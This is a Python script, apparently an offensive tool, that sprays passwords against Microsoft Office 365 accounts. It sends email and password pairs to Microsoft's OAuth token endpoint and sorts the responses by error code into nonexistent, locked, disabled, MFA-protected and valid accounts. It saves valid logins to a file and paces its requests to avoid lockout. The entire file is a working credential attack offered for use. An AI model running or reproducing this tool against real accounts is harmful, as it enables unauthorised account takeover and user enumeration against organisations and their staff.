import requests
import argparse
import re
import time

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

def VerifyOfficeCredentials(Email, Password):
    print(f"{Colors.YELLOW}[*] Sprayying emails on Office.com...{Colors.RESET}")
    Session = requests.Session()
    Body = (
        f"grant_type=password&password={Password}&client_id=4345a7b9-9a63-4910-a426-35363201d503"
        f"&username={Email}&resource=https://graph.windows.net&client_info=1&scope=openid"
    )
    RequestUrl = "https://login.microsoftonline.com/common/oauth2/token"
    Response = Session.post(RequestUrl, data=Body)
    ResponseText = Response.text

    AccountDoesNotExist = re.search("50034", ResponseText)
    InvalidPassword = re.search("50126", ResponseText)
    AccountDisabled = re.search("The user account is disabled", ResponseText)
    AccountLocked = re.search("50053", ResponseText)
    MfaEnabled = re.search("50076", ResponseText)

    if AccountDoesNotExist:
        print(f"{Colors.RED}[-] {Email}: Account does not exist.{Colors.RESET}")
    elif InvalidPassword:
        print(f"{Colors.RED}[-] {Email}: Invalid credentials.{Colors.RESET}")
    elif AccountDisabled:
        print(f"{Colors.YELLOW}[!] {Email}: Account is disabled.{Colors.RESET}")
    elif AccountLocked:
        print(f"{Colors.YELLOW}[!] {Email}: Account is locked out.{Colors.RESET}")
    elif MfaEnabled:
        print(f"{Colors.GREEN}[+] {Email}: Valid credentials, MFA is enabled.{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[+] {Email}: Valid credentials.{Colors.RESET}")
        with open("valid_creds.txt", "a") as File:
            File.write(f"{Email}:{Password}\n")

def SprayAttack(EmailList, PasswordList, Delay):
    for Email in EmailList:
        for Password in PasswordList:
            VerifyOfficeCredentials(Email, Password)
            time.sleep(Delay)

def main():
    Parser = argparse.ArgumentParser(description="Office365 Credential Spraying")
    # Parser.add_argument("SPRAY", action="store_true", help="Run credential spraying module")
    Parser.add_argument("--email", "-e", nargs="?", help="Single email")
    Parser.add_argument("--password", "-p", nargs="?", help="Single password")
    Parser.add_argument("--emailList", "-eL", nargs="?", help="File containing email list")
    Parser.add_argument("--passwordList","-pL", nargs="?", help="File containing password list")
    Parser.add_argument("--DELAY", "-d",type=float, default=1, help="Delay between requests (default: 1s)")

    Args = Parser.parse_args()

    EmailList = []
    PasswordList = []

    if Args.emailList:
        with open(Args.emailList, "r") as File:
            EmailList = [Line.strip() for Line in File.readlines()]
    elif Args.email:
        EmailList.append(Args.email)

    if Args.passwordList:
        with open(Args.passwordList, "r") as File:
            PasswordList = [Line.strip() for Line in File.readlines()]
    elif Args.password:
        PasswordList.append(Args.password)

    if not EmailList or not PasswordList:
        print(f"{Colors.RED}[!] Provide valid email(s) and/or password(s).{Colors.RESET}")
    else:
        SprayAttack(EmailList, PasswordList, Args.DELAY)


if __name__ == "__main__":
    main()
    # Parser = argparse.ArgumentParser(description="Office365 Credential Spraying")
    # Parser.add_argument("SPRAY", action="store_true", help="Run credential spraying module")
    # Parser.add_argument("EMAIL", nargs="?", help="Single email")
    # Parser.add_argument("PASSWORD", nargs="?", help="Single password")
    # Parser.add_argument("EMAILLIST", nargs="?", help="File containing email list")
    # Parser.add_argument("PASSWORDLIST", nargs="?", help="File containing password list")
    # Parser.add_argument("--DELAY", type=float, default=1.5, help="Delay between requests (default: 1.5s)")

    # Args = Parser.parse_args()

    # EmailList = []
    # PasswordList = []

    # if Args.EMAILLIST:
    #     with open(Args.EMAILLIST, "r") as File:
    #         EmailList = [Line.strip() for Line in File.readlines()]
    # elif Args.EMAIL:
    #     EmailList.append(Args.EMAIL)

    # if Args.PASSWORDLIST:
    #     with open(Args.PASSWORDLIST, "r") as File:
    #         PasswordList = [Line.strip() for Line in File.readlines()]
    # elif Args.PASSWORD:
    #     PasswordList.append(Args.PASSWORD)

    # if not EmailList or not PasswordList:
    #     print(f"{Colors.RED}[!] Provide valid email(s) and password(s).{Colors.RESET}")
    # else:
    #     SprayAttack(EmailList, PasswordList, Args.DELAY)
